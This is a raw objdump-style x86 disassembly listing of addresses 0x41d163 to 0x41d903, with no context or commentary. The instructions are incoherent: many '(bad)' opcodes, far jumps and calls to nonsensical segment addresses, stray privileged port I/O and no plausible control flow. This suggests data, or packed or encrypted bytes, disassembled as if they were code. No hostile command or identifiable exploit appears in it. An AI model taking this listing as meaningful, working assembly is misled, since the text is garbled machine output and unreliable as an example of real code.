  41d163:	sub    DWORD PTR [esi-0x25865f52],edx
  41d169:	popa   
  41d16a:	pop    ss
  41d16b:	cmp    eax,0xb0c081
  41d170:	mov    dh,0x38
  41d172:	jecxz  0x41d111
  41d174:	fbstp  TBYTE PTR [edi-0x11]
  41d177:	outs   dx,DWORD PTR ds:[esi]
  41d178:	push   0xffffff89
  41d17a:	stc    
  41d17b:	fdivr  QWORD PTR [esi-0x7f]
  41d17e:	mov    ebx,0x8b45a84f
  41d183:	cmp    DWORD PTR [edx-0x6],0x62da800e
  41d18a:	aam    0xc4
  41d18c:	pop    esi
  41d18d:	jmp    0x153e:0x491d9a
  41d194:	mov    al,0xcf
  41d197:	mov    al,0xf3
  41d199:	pop    es
  41d19a:	push   0xffffffa9
  41d19c:	pop    esi
  41d19d:	xchg   esp,eax
  41d19e:	stos   BYTE PTR es:[edi],al
  41d19f:	sbb    eax,0xf2b02667
  41d1a4:	mov    edi,esi
  41d1a6:	inc    esi
  41d1a7:	or     BYTE PTR [ebx-0x55],ch
  41d1aa:	jl     0x41d1cc
  41d1ac:	adc    ch,cl
  41d1ae:	addr16 rcr esp,1
  41d1b1:	or     ebp,DWORD PTR [edx-0x2fc3994a]
  41d1b7:	stos   DWORD PTR es:[edi],eax
  41d1b8:	mov    al,ds:0xab1338ba
  41d1bd:	xor    DWORD PTR [ebp+0x42],edi
  41d1c0:	pop    es
  41d1c1:	dec    esi
  41d1c2:	imul   ebx,DWORD PTR [ebp-0x6b],0xa0008db
  41d1c9:	mov    dh,0x2e
  41d1cb:	cmp    edx,ebp
  41d1cd:	inc    ebx
  41d1ce:	int    0x1a
  41d1d0:	and    BYTE PTR [edi],0x57
  41d1d3:	add    edx,DWORD PTR [ebp+0x18280460]
  41d1d9:	shl    BYTE PTR [edx],1
  41d1db:	imul   edi,DWORD PTR [eax],0x71
  41d1de:	jbe    0x41d1de
  41d1e0:	jmp    0x41d22e
  41d1e2:	pop    ss
  41d1e3:	outs   dx,DWORD PTR ds:[esi]
  41d1e4:	(bad)  
  41d1e5:	xchg   edx,eax
  41d1e6:	shr    bh,0x86
  41d1e9:	adc    al,0x30
  41d1eb:	ja     0x41d231
  41d1ed:	xor    edx,DWORD PTR [esi]
  41d1ef:	jb     0x41d181
  41d1f1:	push   ds
  41d1f2:	nop
  41d1f3:	dec    eax
  41d1f4:	pop    ebx
  41d1f5:	jb     0x41d210
  41d1f7:	cmp    ch,BYTE PTR [esi]
  41d1f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1fa:	pop    ss
  41d1fb:	push   0x32
  41d1fd:	popa   
  41d1fe:	dec    eax
  41d1ff:	int    0xed
  41d201:	add    al,0x35
  41d203:	cmp    al,0x1d
  41d205:	fsub   DWORD PTR [edi]
  41d207:	inc    esi
  41d208:	scas   eax,DWORD PTR es:[edi]
  41d209:	cmp    DWORD PTR [edi-0x24c06da8],ebx
  41d20f:	push   0xffffffb2
  41d211:	shl    BYTE PTR [ebx],cl
  41d213:	cmp    al,0x94
  41d215:	pop    ds
  41d216:	mov    ah,0x47
  41d218:	ffreep st(7)
  41d21a:	push   DWORD PTR [eax+0x35f18f9f]
  41d220:	or     DWORD PTR [ecx-0x12],0x51
  41d224:	in     eax,0xac
  41d226:	adc    bl,BYTE PTR [ebp+0x3]
  41d229:	arpl   WORD PTR ds:0xdd0223f9,bp
  41d22f:	out    0xf9,eax
  41d231:	mov    ebx,0xec77c83f
  41d236:	mov    bl,0x91
  41d238:	add    DWORD PTR [edx],ecx
  41d23a:	jne    0x41d1bf
  41d23c:	mov    ebp,0xb1fa1a49
  41d241:	mov    ds:0x3b0622d5,al
  41d246:	or     DWORD PTR [eax-0x36],esi
  41d249:	pusha  
  41d24a:	or     bh,BYTE PTR [edi+0x72e43360]
  41d250:	rcl    ebx,0x80
  41d253:	movsx  esp,BYTE PTR [ebp-0x61]
  41d257:	aad    0x10
  41d259:	das    
  41d25a:	pop    eax
  41d25b:	mov    ah,0x41
  41d25d:	sub    BYTE PTR [ebx-0x27e317bb],cl
  41d263:	pop    ecx
  41d264:	loopne 0x41d28f
  41d266:	dec    eax
  41d267:	adc    eax,0xbc6146c1
  41d26c:	fs nop
  41d26e:	call   0x5701:0xa288dd0
  41d275:	sbb    eax,0x11d0b89f
  41d27a:	xor    al,BYTE PTR [ebx+0x1de86be1]
  41d280:	or     ah,BYTE PTR [ebx+0x28]
  41d283:	push   cs
  41d284:	lea    ebx,[ecx+ecx*1]
  41d287:	inc    edx
  41d288:	mov    ch,0xff
  41d28a:	outs   dx,DWORD PTR ds:[esi]
  41d28b:	in     eax,dx
  41d28c:	push   ebp
  41d28d:	xchg   esi,eax
  41d28e:	cs pop ss
  41d290:	mov    WORD PTR [esi+0x7f18f533],?
  41d296:	jno    0x41d2bd
  41d298:	xorps  xmm3,XMMWORD PTR [ebx-0x11]
  41d29c:	adc    al,BYTE PTR [esi]
  41d29e:	jb     0x41d26d
  41d2a0:	ret    0xedeb
  41d2a3:	sahf   
  41d2a4:	xlat   BYTE PTR ds:[ebx]
  41d2a5:	mov    DWORD PTR [edi],ebx
  41d2a7:	mov    dl,BYTE PTR [ebx+0x22]
  41d2aa:	(bad)  
  41d2ac:	mov    al,ds:0xb2405476
  41d2b1:	in     eax,0xc8
  41d2b3:	pusha  
  41d2b4:	jbe    0x41d2b9
  41d2b6:	adc    al,0x22
  41d2b8:	gs pop ecx
  41d2ba:	mov    WORD PTR [edx],?
  41d2bc:	sub    eax,0x70d65fe3
  41d2c1:	sub    eax,0x82bb45b1
  41d2c6:	jp     0x41d2aa
  41d2c8:	cmp    eax,DWORD PTR [edx+edx*2+0x1227cfe1]
  41d2cf:	mov    bh,0xdd
  41d2d1:	aaa    
  41d2d2:	ins    BYTE PTR es:[edi],dx
  41d2d3:	sub    ebx,edx
  41d2d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2d6:	lea    ebp,[ebx+0x1d]
  41d2d9:	nop
  41d2da:	arpl   WORD PTR [ebx],ax
  41d2dc:	xchg   DWORD PTR [ecx-0x47],ecx
  41d2df:	scas   al,BYTE PTR es:[edi]
  41d2e0:	pop    ecx
  41d2e1:	sub    bl,BYTE PTR ds:0xc8cb1231
  41d2e7:	(bad)  
  41d2e8:	cmp    al,0xc
  41d2ea:	sbb    eax,0xb6d1ca67
  41d2ef:	jmp    0x3421a559
  41d2f4:	pop    ebx
  41d2f5:	mov    ebx,0x59ba665d
  41d2fa:	xchg   esi,eax
  41d2fb:	outs   dx,DWORD PTR ds:[esi]
  41d2fc:	(bad)  [esi+esi*1-0x65]
  41d300:	pop    ecx
  41d301:	adc    DWORD PTR [ecx+0x32e8ab0f],ecx
  41d307:	aaa    
  41d308:	es je  0x41d2ec
  41d30b:	cmp    DWORD PTR [edx-0x44156d5f],edx
  41d311:	or     eax,0x99b23ef5
  41d316:	or     DWORD PTR [ebx+eiz*4+0xc],esi
  41d31a:	out    0x0,al
  41d31c:	xchg   ebx,eax
  41d31d:	jnp    0x41d38b
  41d31f:	imul   BYTE PTR [eax+edx*1-0x2e8951c7]
  41d326:	cwde   
  41d327:	adc    ah,BYTE PTR [edx]
  41d329:	clc    
  41d32a:	ja     0x41d2f4
  41d32c:	and    DWORD PTR [ebx+ebx*1],ecx
  41d32f:	add    al,0x38
  41d331:	push   edx
  41d332:	ds inc ebp
  41d334:	push   eax
  41d335:	imul   edi,DWORD PTR [edi+eax*4+0x6b8bf450],0x57
  41d33d:	scas   al,BYTE PTR es:[edi]
  41d33e:	sub    DWORD PTR [esi+0x5b002779],0x5a3e2d44
  41d348:	ins    DWORD PTR es:[edi],dx
  41d349:	pusha  
  41d34a:	out    dx,al
  41d34b:	into   
  41d34c:	jnp    0x41d2f0
  41d34e:	push   cs
  41d34f:	les    ebp,FWORD PTR [ebx-0x3f]
  41d352:	adc    esi,DWORD PTR [ebx-0x59162b21]
  41d358:	scas   al,BYTE PTR es:[edi]
  41d359:	rol    BYTE PTR [eax],cl
  41d35b:	mov    ch,0x5e
  41d35d:	jo     0x41d349
  41d35f:	push   es
  41d360:	sub    al,0x9e
  41d362:	inc    esi
  41d363:	out    0x3f,eax
  41d365:	jl     0x41d3b7
  41d367:	mov    edx,0x24c4b9f5
  41d36c:	pop    ecx
  41d36d:	jb     0x41d3ba
  41d36f:	adc    al,0x38
  41d371:	jb     0x41d3d8
  41d373:	xchg   ebx,eax
  41d374:	iret   
  41d375:	cli    
  41d376:	mov    al,0x23
  41d378:	or     ecx,DWORD PTR [esi]
  41d37a:	out    0xd0,eax
  41d37c:	add    esi,ecx
  41d37e:	dec    ecx
  41d37f:	jne    0x41d3f9
  41d381:	nop
  41d382:	push   es
  41d383:	adc    al,0x27
  41d385:	adc    eax,0xa712c98a
  41d38a:	test   BYTE PTR [esi],cl
  41d38c:	lods   eax,DWORD PTR ds:[esi]
  41d38d:	sbb    BYTE PTR [edi],bl
  41d38f:	mov    cl,0xbb
  41d391:	mov    ebx,ebx
  41d393:	sub    al,0x17
  41d395:	push   ecx
  41d396:	ret    
  41d397:	cmp    cl,dl
  41d399:	jmp    0xda87:0x96efc95d
  41d3a0:	push   ss
  41d3a1:	fdivr  st(5),st
  41d3a3:	cmp    edx,edi
  41d3a5:	jmp    0x98733542
  41d3aa:	inc    esi
  41d3ab:	(bad)  
  41d3ac:	addr16 jb 0x41d397
  41d3af:	aaa    
  41d3b0:	call   0x8b52f254
  41d3b5:	mov    ah,BYTE PTR ds:0x9a85f0de
  41d3bb:	(bad)  
  41d3bc:	xchg   ebx,eax
  41d3bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3be:	adc    ecx,edx
  41d3c0:	xchg   esi,eax
  41d3c1:	jno    0x41d3c8
  41d3c3:	pop    esi
  41d3c4:	pop    esi
  41d3c5:	sbb    eax,0x53da0950
  41d3ca:	ret    0x9dac
  41d3cd:	imul   edx,esp,0x7b964b8a
  41d3d3:	add    eax,esi
  41d3d5:	inc    esi
  41d3d6:	cmp    BYTE PTR [ebx-0x5ee40b2b],bl
  41d3dc:	daa    
  41d3dd:	mov    ds:0x444dd21a,eax
  41d3e2:	mov    ecx,DWORD PTR [edx]
  41d3e4:	push   eax
  41d3e5:	cmp    DWORD PTR [ebp-0x1e],0x8
  41d3e9:	cwde   
  41d3ea:	outs   dx,BYTE PTR ds:[esi]
  41d3eb:	cmp    al,0xb2
  41d3ed:	push   esi
  41d3ee:	cli    
  41d3ef:	fwait
  41d3f0:	sti    
  41d3f1:	out    dx,eax
  41d3f2:	adc    DWORD PTR [ebx],eax
  41d3f4:	lea    ebp,[ecx-0x4]
  41d3f7:	mov    al,ds:0xc95d8e12
  41d3fc:	add    eax,0x4fca7f25
  41d401:	dec    esi
  41d402:	clc    
  41d403:	push   ebx
  41d404:	adc    al,0x43
  41d406:	mov    eax,0x8cfa0b2
  41d40b:	lea    esi,[esi]
  41d40d:	scas   eax,DWORD PTR es:[edi]
  41d40e:	xor    al,0xc5
  41d410:	push   ebp
  41d411:	popa   
  41d412:	ss retf 0xaa46
  41d416:	add    eax,DWORD PTR [edi-0x7c]
  41d419:	mov    dl,0xbf
  41d41b:	pushf  
  41d41c:	xchg   esp,eax
  41d41d:	sar    BYTE PTR [edi+0x1b],1
  41d420:	repnz add eax,0xb0e618c9
  41d426:	sbb    ecx,DWORD PTR [edi+0x6e]
  41d429:	mov    esi,0x1636615f
  41d42e:	cld    
  41d42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d430:	jl     0x41d492
  41d432:	jo     0x41d479
  41d434:	dec    esi
  41d435:	push   edi
  41d436:	lds    esp,FWORD PTR [edi]
  41d438:	xchg   ecx,eax
  41d439:	fnsave [ebx-0xf758175]
  41d43f:	push   ecx
  41d440:	cmp    ebx,esi
  41d442:	sub    BYTE PTR [ebx+0x41a43de2],al
  41d448:	in     eax,dx
  41d449:	pop    ds
  41d44a:	dec    ebx
  41d44b:	call   0x7c135dcd
  41d450:	sub    al,BYTE PTR [esi-0x34]
  41d453:	mov    ch,0x5d
  41d455:	(bad)  
  41d456:	enter  0xac74,0xb6
  41d45a:	(bad)  
  41d45b:	scas   al,BYTE PTR es:[edi]
  41d45c:	cld    
  41d45d:	mov    esp,0x4901927f
  41d462:	add    dh,bl
  41d464:	dec    DWORD PTR [esi]
  41d466:	retf   
  41d467:	leave  
  41d468:	lods   al,BYTE PTR ds:[esi]
  41d469:	adc    BYTE PTR [eax+0x5e],dl
  41d46c:	push   0x2d0ff8ce
  41d471:	je     0x41d417
  41d473:	sbb    BYTE PTR [ebx],ch
  41d475:	mov    al,0x5
  41d477:	add    bh,BYTE PTR ss:[ecx-0x65]
  41d47b:	into   
  41d47c:	fistp  QWORD PTR [edx+0x59bc052a]
  41d482:	mov    esi,DWORD PTR [edx+edx*8-0x6d11ce7f]
  41d489:	or     ah,dh
  41d48b:	cmp    edx,0x84edaa49
  41d491:	retf   0xdb21
  41d494:	mov    ch,0xa
  41d496:	jae    0x41d4d0
  41d498:	fstp   st(1)
  41d49a:	stc    
  41d49b:	pop    ebx
  41d49c:	jbe    0x41d4ee
  41d49e:	cld    
  41d49f:	stos   DWORD PTR es:[edi],eax
  41d4a0:	dec    ebp
  41d4a1:	cmc    
  41d4a2:	out    0xdc,al
  41d4a4:	xor    edx,DWORD PTR [eax-0x41]
  41d4a7:	das    
  41d4a8:	ret    
  41d4a9:	stos   BYTE PTR es:[edi],al
  41d4aa:	and    eax,0x8c0a29e
  41d4af:	jae    0x41d478
  41d4b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4b2:	js     0x41d455
  41d4b4:	loopne 0x41d46f
  41d4b6:	jge    0x41d4a4
  41d4b8:	lods   al,BYTE PTR ds:[esi]
  41d4b9:	adc    bl,BYTE PTR [esi-0x7659c0b0]
  41d4bf:	or     al,0x2a
  41d4c1:	loope  0x41d469
  41d4c3:	pop    esi
  41d4c4:	or     ebx,ebp
  41d4c6:	and    esi,ecx
  41d4c8:	imul   eax,DWORD PTR [ebp-0x5d],0x51
  41d4cc:	sub    dl,BYTE PTR [ebx+0x2d4ad9d4]
  41d4d2:	fcom   QWORD PTR [ecx+0x170c8a43]
  41d4d8:	das    
  41d4d9:	add    eax,0xbefd3bff
  41d4de:	pop    esp
  41d4df:	(bad)
  41d4e4:	adc    ebx,DWORD PTR [ecx+0x1e1bdb25]
  41d4ea:	xor    eax,0x8e304e2c
  41d4ef:	hlt    
  41d4f0:	test   eax,0xfab3d33d
  41d4f5:	ins    DWORD PTR es:[edi],dx
  41d4f6:	dec    eax
  41d4f7:	sbb    cl,bl
  41d4f9:	jg     0x41d504
  41d4fb:	test   al,0xd4
  41d4fd:	jg     0x41d55d
  41d4ff:	cs repz mov ecx,0xb0c47d4e
  41d506:	scas   eax,DWORD PTR es:[edi]
  41d507:	mov    eax,ds:0x8caaf77c
  41d50c:	outs   dx,BYTE PTR ds:[esi]
  41d50d:	cmp    eax,0xa0c7fdb6
  41d512:	cmc    
  41d513:	mov    WORD PTR [esi-0x34],es
  41d516:	mov    ch,0x7d
  41d518:	jmp    0xab6a4555
  41d51d:	jl     0x41d4bb
  41d51f:	ss test al,0x48
  41d522:	jg     0x41d581
  41d524:	pop    ss
  41d525:	test   al,0xa2
  41d527:	push   esi
  41d528:	arpl   WORD PTR [ebp-0x400f36e0],cx
  41d52e:	pusha  
  41d52f:	or     DWORD PTR [edx+0x4f],edx
  41d532:	mov    al,0x68
  41d534:	fisubr DWORD PTR ds:0x5e71c696
  41d53a:	cld    
  41d53b:	mov    ecx,0x4f455041
  41d540:	aad    0x12
  41d542:	push   es
  41d543:	inc    esi
  41d544:	mov    dl,0xd8
  41d546:	xor    BYTE PTR [edi-0x27e3f6a3],ah
  41d54c:	test   BYTE PTR [edi-0x15080790],ah
  41d552:	jg     0x41d5b2
  41d554:	loop   0x41d54c
  41d556:	call   0xb7eb:0x35d5f218
  41d55d:	jnp    0x41d5b2
  41d55f:	push   ecx
  41d560:	clc    
  41d561:	push   ds
  41d562:	jg     0x41d571
  41d564:	arpl   WORD PTR [ecx-0x4927ba54],bx
  41d56a:	adc    BYTE PTR [edi+ebp*2],dl
  41d56d:	out    0x84,eax
  41d56f:	xor    eax,0xa073dc54
  41d574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d575:	and    DWORD PTR ds:0x9a27d0c5,0xb1868bda
  41d57f:	fwait
  41d580:	add    ah,ch
  41d582:	and    eax,0x7a69d4a8
  41d587:	push   esi
  41d588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d589:	mov    dl,0x24
  41d58b:	adc    ebp,DWORD PTR [ecx]
  41d58d:	mov    edi,0x22c16056
  41d592:	stos   BYTE PTR es:[edi],al
  41d593:	cmc    
  41d594:	add    eax,0x2a677ed5
  41d599:	and    BYTE PTR ds:0xe4f08784,bl
  41d59f:	mov    bl,0x9f
  41d5a1:	dec    esp
  41d5a2:	jae    0x41d543
  41d5a4:	clc    
  41d5a5:	adc    eax,0xf8977a50
  41d5aa:	(bad)  
  41d5ab:	(bad)  
  41d5ad:	fwait
  41d5ae:	push   es
  41d5af:	call   0x9a8e:0xc25f0892
  41d5b6:	stos   BYTE PTR es:[edi],al
  41d5b7:	mov    eax,0x6333958a
  41d5bc:	add    ah,dl
  41d5be:	xor    al,0x41
  41d5c0:	inc    ecx
  41d5c1:	xor    BYTE PTR [eax+0x220286c0],ah
  41d5c7:	fiadd  WORD PTR [ecx-0x70ce0322]
  41d5cd:	xchg   edi,eax
  41d5ce:	or     BYTE PTR [eax-0x5d32c1ca],ch
  41d5d4:	sahf   
  41d5d5:	adc    eax,0x6b681c8d
  41d5da:	and    ch,ah
  41d5dc:	inc    esp
  41d5dd:	mov    bh,BYTE PTR [esi+0x12152071]
  41d5e3:	aaa    
  41d5e4:	scas   eax,DWORD PTR es:[edi]
  41d5e5:	xchg   esp,eax
  41d5e6:	add    BYTE PTR [ecx-0x68b0ca9f],al
  41d5ec:	cmp    eax,0x87f3d71c
  41d5f1:	loop   0x41d5c1
  41d5f3:	test   al,0x85
  41d5f5:	into   
  41d5f6:	and    al,0x7
  41d5f8:	call   0x256:0xf9d3f953
  41d5ff:	mov    cl,0x53
  41d601:	inc    ebx
  41d602:	shl    DWORD PTR [ebx-0x24],cl
  41d605:	mov    al,0xf7
  41d607:	push   ss
  41d608:	or     DWORD PTR [esi+0x16],esi
  41d60b:	dec    edx
  41d60c:	mov    cl,0x5e
  41d60e:	lahf   
  41d60f:	mov    bh,dh
  41d611:	vcvtsi2ss xmm1,xmm7,DWORD PTR [eax-0x5fe901ee]
  41d619:	in     al,dx
  41d61a:	rol    DWORD PTR [ecx],1
  41d61c:	pop    ds
  41d61d:	pusha  
  41d61e:	dec    ebp
  41d61f:	inc    esi
  41d620:	lds    edi,FWORD PTR [ecx+0x7b]
  41d623:	jo     0x41d69f
  41d625:	sbb    esi,ebx
  41d627:	fcomp  DWORD PTR [eax]
  41d629:	test   eax,0x3bf511fc
  41d62e:	aad    0x64
  41d630:	nop    esp
  41d633:	cmp    eax,0x7b5e657e
  41d638:	cdq    
  41d639:	lock imul esp,DWORD PTR [bp-0x6d76],0x59
  41d640:	dec    ecx
  41d641:	xor    ch,dh
  41d643:	pop    es
  41d644:	sbb    al,0x70
  41d646:	fsub   st,st(7)
  41d648:	daa    
  41d649:	inc    edx
  41d64a:	mov    bh,0xe
  41d64c:	adc    eax,0xcd82e466
  41d651:	shr    DWORD PTR [ebp-0x2cc9d9e7],0x84
  41d658:	sub    bl,ah
  41d65a:	or     DWORD PTR ds:0x945a2ce,esi
  41d660:	xor    eax,0xfbaf4b1c
  41d665:	idiv   BYTE PTR [edi-0x6f00da3e]
  41d66b:	bound  esp,QWORD PTR [esi-0x4631d1cd]
  41d671:	xchg   ecx,eax
  41d672:	into   
  41d673:	aas    
  41d674:	bound  edi,QWORD PTR [edi-0x2807c130]
  41d67a:	jg     0x41d681
  41d67c:	or     BYTE PTR [eax+0x6424b882],dl
  41d682:	and    al,0x81
  41d684:	dec    esi
  41d685:	nop
  41d686:	jge    0x41d702
  41d688:	jecxz  0x41d639
  41d68a:	mov    es,WORD PTR [edx]
  41d68c:	fsub   DWORD PTR [eax-0x65]
  41d68f:	sbb    eax,eax
  41d691:	inc    ebp
  41d692:	into   
  41d693:	or     DWORD PTR [edi],esp
  41d695:	mov    cl,bl
  41d697:	mov    ch,0x5b
  41d699:	push   ebp
  41d69a:	dec    ebx
  41d69b:	push   esi
  41d69c:	(bad)  
  41d69d:	cwde   
  41d69e:	mov    bl,0x50
  41d6a0:	cli    
  41d6a1:	push   esi
  41d6a2:	xchg   edi,eax
  41d6a3:	lods   eax,DWORD PTR ds:[esi]
  41d6a4:	fisub  DWORD PTR [ecx-0x3c0289b4]
  41d6aa:	inc    eax
  41d6ab:	inc    ebp
  41d6ac:	ror    BYTE PTR ds:0x975fa94a,0x1
  41d6b3:	icebp  
  41d6b4:	push   cs
  41d6b5:	push   0x31e7905
  41d6ba:	(bad)  
  41d6bb:	mov    al,ds:0x7140979b
  41d6c0:	jne    0x41d667
  41d6c2:	loopne 0x41d6cd
  41d6c4:	scas   eax,DWORD PTR es:[edi]
  41d6c5:	lea    eax,[ebx+ebx*2-0x539a96b5]
  41d6cc:	mov    ecx,0x75797bef
  41d6d1:	arpl   WORD PTR [edx+0x1878e836],di
  41d6d7:	xor    DWORD PTR [ebp+0x7a],esp
  41d6da:	in     al,dx
  41d6db:	les    esi,FWORD PTR [esi]
  41d6dd:	inc    esp
  41d6de:	pop    ds
  41d6df:	out    dx,eax
  41d6e0:	sbb    BYTE PTR ss:[edi],al
  41d6e3:	repz pop ebx
  41d6e5:	lods   eax,DWORD PTR ds:[esi]
  41d6e6:	loopne 0x41d6d3
  41d6e8:	retf   
  41d6e9:	adc    DWORD PTR ss:[edi+0x338b9bd],ebx
  41d6f0:	test   DWORD PTR [edi+0x4c],ecx
  41d6f3:	push   cs
  41d6f4:	lock es jno 0x41d6e2
  41d6f8:	lea    ebp,[ecx-0x4e]
  41d6fb:	les    esp,FWORD PTR [eax]
  41d6fd:	fnstenv [ebp+0x78]
  41d700:	xchg   ebp,eax
  41d701:	loope  0x41d6cf
  41d703:	jae    0x41d74f
  41d705:	das    
  41d706:	fwait
  41d707:	dec    edi
  41d708:	mov    edi,esi
  41d70a:	mov    ds:0xc635c2fb,eax
  41d70f:	(bad)  
  41d710:	cs pop ebx
  41d712:	lahf   
  41d713:	fisttp WORD PTR es:[edx]
  41d716:	pop    esi
  41d717:	inc    ebp
  41d718:	or     edi,DWORD PTR [edx+0x420f9cb0]
  41d71e:	(bad)  
  41d720:	push   es
  41d721:	add    BYTE PTR [edx-0x2380adec],dl
  41d727:	add    DWORD PTR [esp+ebp*1],esp
  41d72a:	test   eax,0xb2a95e7e
  41d72f:	mov    ebp,0x3632ad03
  41d734:	(bad)  
  41d735:	sub    DWORD PTR [eax-0x616f60c3],edx
  41d73b:	inc    BYTE PTR [esi-0x1f578632]
  41d741:	jbe    0x41d71e
  41d743:	mov    ebx,0xded56aff
  41d748:	xor    DWORD PTR [ebx-0x57],esi
  41d74b:	xchg   ebp,eax
  41d74c:	es aad 0xd8
  41d74f:	dec    edi
  41d750:	shl    DWORD PTR [ebp+0xc8441d5],1
  41d756:	dec    ebx
  41d757:	mov    ch,0x68
  41d759:	pop    ebp
  41d75a:	push   bx
  41d75c:	pop    ebp
  41d75d:	push   0x1
  41d75f:	cmp    ecx,DWORD PTR [ecx-0x1061955b]
  41d765:	push   ss
  41d766:	mov    ds,WORD PTR [edi+0x50f959fd]
  41d76c:	test   eax,0x38fca7ef
  41d771:	pop    esi
  41d772:	inc    edx
  41d773:	or     bh,BYTE PTR [edx+0x15]
  41d776:	adc    BYTE PTR [eax-0xa],ch
  41d779:	dec    edx
  41d77a:	cli    
  41d77b:	dec    edi
  41d77c:	or     BYTE PTR [ecx+0x6ea58851],al
  41d782:	or     bl,ah
  41d784:	dec    esi
  41d785:	xor    edi,0x8c93bc13
  41d78b:	sbb    eax,0xb37696df
  41d790:	loop   0x41d758
  41d792:	mov    edi,0xa021ff72
  41d797:	mov    bl,0x59
  41d799:	jbe    0x41d818
  41d79b:	test   BYTE PTR [ecx],al
  41d79d:	pop    eax
  41d79e:	dec    edi
  41d79f:	or     al,BYTE PTR ss:[ebx-0x444eff78]
  41d7a6:	add    al,0x49
  41d7a8:	add    eax,0x57cd444b
  41d7ad:	out    dx,al
  41d7ae:	call   0x87c6c628
  41d7b3:	pop    edx
  41d7b4:	sti    
  41d7b5:	sbb    DWORD PTR [ebx-0x32fe8199],esp
  41d7bb:	xchg   DWORD PTR ds:0x331e49e0,edi
  41d7c1:	fcmovnu st,st(2)
  41d7c3:	(bad)  
  41d7c4:	xlat   BYTE PTR ds:[ebx]
  41d7c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7c6:	sbb    BYTE PTR [ecx+0xa],al
  41d7c9:	fsub   QWORD PTR [esi+0xa]
  41d7cc:	cmp    DWORD PTR [edi+0x4be237d3],ecx
  41d7d2:	pop    edi
  41d7d3:	mov    eax,0x39c0d95d
  41d7d8:	in     eax,0x7e
  41d7da:	and    ah,ah
  41d7dc:	dec    BYTE PTR [edx+0x17]
  41d7df:	call   0xa7f3842c
  41d7e4:	sahf   
  41d7e5:	sub    ebx,ecx
  41d7e7:	imul   ebx,esp,0x25
  41d7ea:	es ret 
  41d7ec:	cdq    
  41d7ed:	test   ebp,edi
  41d7ef:	xchg   esi,eax
  41d7f0:	sub    DWORD PTR [esi-0x3ccc35e8],0x76
  41d7f7:	outs   dx,BYTE PTR ds:[esi]
  41d7f8:	xchg   esp,eax
  41d7f9:	sbb    DWORD PTR [eax-0x58a76ada],0x12
  41d800:	(bad)  
  41d801:	xor    BYTE PTR [ebp-0x411f9c1e],al
  41d807:	adc    eax,0xd563ddc9
  41d80c:	xchg   esp,eax
  41d80d:	push   ss
  41d80e:	test   DWORD PTR [esi],ebx
  41d810:	or     BYTE PTR [ebx-0x25aa1a52],0x43
  41d817:	shr    DWORD PTR [esi-0x7b0cbb74],0xf4
  41d81e:	das    
  41d81f:	sbb    al,0x1
  41d821:	jno    0x41d7cc
  41d823:	retf   0x88f9
  41d826:	mov    WORD PTR [ecx+0x2ffca0],gs
  41d82c:	fwait
  41d82d:	push   ebp
  41d82e:	cld    
  41d82f:	push   ebx
  41d830:	inc    ebx
  41d831:	dec    esp
  41d832:	mov    WORD PTR [eax+eax*4-0x586632f1],gs
  41d839:	lods   al,BYTE PTR ds:[esi]
  41d83a:	inc    ebp
  41d83b:	dec    eax
  41d83c:	jg     0x41d8bd
  41d83e:	fwait
  41d83f:	(bad)  
  41d840:	xchg   ebx,eax
  41d841:	push   edi
  41d842:	mov    ecx,0x99d6c511
  41d847:	mov    ss,WORD PTR [edx+ebx*1+0x5c]
  41d84b:	dec    ecx
  41d84c:	push   edi
  41d84d:	sahf   
  41d84e:	in     eax,0x37
  41d850:	inc    ebx
  41d851:	icebp  
  41d852:	cmp    eax,0x608ab11a
  41d857:	xchg   ebx,eax
  41d858:	into   
  41d859:	pop    ebx
  41d85a:	inc    esi
  41d85b:	add    DWORD PTR [ecx],edi
  41d85d:	test   al,0x57
  41d85f:	daa    
  41d860:	ins    DWORD PTR es:[edi],dx
  41d861:	or     BYTE PTR [eax-0x2f],ah
  41d864:	inc    edi
  41d865:	or     al,0xda
  41d867:	jno    0x41d8ca
  41d869:	fs jmp 0x6ac0:0xa7a5a529
  41d871:	mov    ebx,0xfeacee21
  41d876:	xor    DWORD PTR [ebx+0x6b4e8f54],esi
  41d87c:	cmc    
  41d87d:	adc    DWORD PTR [ebx+0x19],edx
  41d880:	or     al,0xf0
  41d882:	rcl    BYTE PTR [eax-0x24],cl
  41d885:	xchg   esi,eax
  41d886:	or     DWORD PTR [eax+0x4cbf2eda],esi
  41d88c:	mov    dl,BYTE PTR ds:0x5e4781d7
  41d892:	xchg   ebp,eax
  41d893:	sbb    DWORD PTR [esi],edx
  41d895:	mov    esi,0x3f574d3e
  41d89a:	sbb    eax,0x28e4ba4f
  41d89f:	jle    0x41d913
  41d8a1:	push   esp
  41d8a2:	enter  0x5b6b,0x39
  41d8a6:	sbb    edx,DWORD PTR [edx+0x68046a87]
  41d8ac:	mov    ebp,0x41cbb89c
  41d8b1:	add    edx,esi
  41d8b3:	inc    ebp
  41d8b4:	sahf   
  41d8b5:	cmc    
  41d8b6:	pop    eax
  41d8b7:	push   edi
  41d8b8:	bound  ebp,QWORD PTR ds:0x82c18db6
  41d8be:	test   al,0xd1
  41d8c0:	adc    cl,BYTE PTR [ebp-0x11]
  41d8c3:	pop    ss
  41d8c4:	scas   al,BYTE PTR es:[edi]
  41d8c5:	xchg   ecx,eax
  41d8c6:	test   DWORD PTR [edi-0x6],ebx
  41d8c9:	ins    BYTE PTR es:[edi],dx
  41d8ca:	(bad)  
  41d8cb:	and    eax,0x3168708
  41d8d0:	es fld st(6)
  41d8d3:	mov    fs,esi
  41d8d5:	imul   ebp,eax,0x5e12e9c9
  41d8db:	mov    dh,0x37
  41d8dd:	mov    esi,0x7f102d27
  41d8e2:	hlt    
  41d8e3:	or     BYTE PTR [esi-0x34623de8],dh
  41d8e9:	cli    
  41d8ea:	add    BYTE PTR [esi-0x3c],bl
  41d8ed:	xor    DWORD PTR [edi],esi
  41d8ef:	jmp    0x2369fb44
  41d8f4:	pop    eax
  41d8f5:	call   0x5b1249ff
  41d8fa:	mov    BYTE PTR [ebx+ebp*8-0x78],ah
  41d8fe:	jg     0x41d8b3
  41d900:	and    eax,DWORD PTR [ebp+0x32]
  41d903:	loop   0x41d95f
